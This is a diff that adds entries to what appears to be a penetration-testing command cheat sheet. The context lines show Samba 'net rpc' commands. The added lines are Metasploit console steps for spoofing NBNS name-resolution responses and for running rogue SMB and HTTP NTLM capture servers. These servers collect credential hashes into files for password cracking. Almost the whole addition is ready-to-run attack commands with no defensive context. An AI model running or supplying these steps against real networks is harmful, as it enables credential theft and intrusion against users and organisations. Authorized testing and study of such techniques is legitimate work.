@@ -88,3 +88,25 @@ net
 	windows net.exe port for linux smbd
 net -S localhost -U% rpc rights list
 net -S localhost -U% rpc rights list accounts
+
+
+
+NBNS Spoof / Capture
+NBNS Spoof
+msf > use auxiliary/spoof/nbns/nbns_response
+msf auxiliary(nbns_response) > show options
+msf auxiliary(nbns_response) > set INTERFACE eth0
+msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
+msf auxiliary(nbns_response) > run
+
+SMB Capture
+msf > use auxiliary/server/capture/smb
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
+msf auxiliary(smb) > run
+
+HTTP NTLM Capture
+msf auxiliary(smb) > use auxiliary/server/capture/http_ntlm
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_http
+msf auxiliary(smb) > set SRVPORT 80
+msf auxiliary(smb) > set URIPATH /
+msf auxiliary(smb) > run
